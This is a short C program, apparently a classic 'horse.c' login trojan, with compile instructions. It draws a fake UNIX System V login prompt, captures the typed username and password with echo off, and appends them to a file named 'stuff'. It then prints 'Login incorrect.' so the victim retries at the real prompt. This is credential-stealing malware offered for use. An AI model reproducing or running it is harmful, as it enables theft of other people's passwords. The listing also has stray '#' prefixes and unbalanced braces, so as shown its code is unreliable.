#define SYSTEM "\n\nUNIX(r) System V\n\n"
#define LOGIN  "login: "
#define PASSWORD "password:"
#define WAIT 2
#define INCORRECT "Login incorrect.\n"
#define FILENAME "stuff"

#include <curses.h>
#include <signal.h>

int stop();

main() {

char name[10], password[10];

int i;

FILE *fp, *fopen();
signal(SIGINT,stop);
initscr();
printf(SYSTEM);
printf(LOGIN);
scanf("%[^\n]",name);
getchar();
noecho();
printf(PASSWORD);
scanf("%[^\n]",password);
printf("\n");
getchar();
echo();
sleep(WAIT);

if ( ( fp = fopen(FILENAME,"a") )  != NULL ) {
#fprintf(fp,"login %s has password %s\n",name,password);
#fclose(fp);
#}

printf(INCORRECT);
endwin();
}
stop()
{
endwin();
exit(0);

}



Compiling Info:

$cc horse.c -lcurses -ltermcap


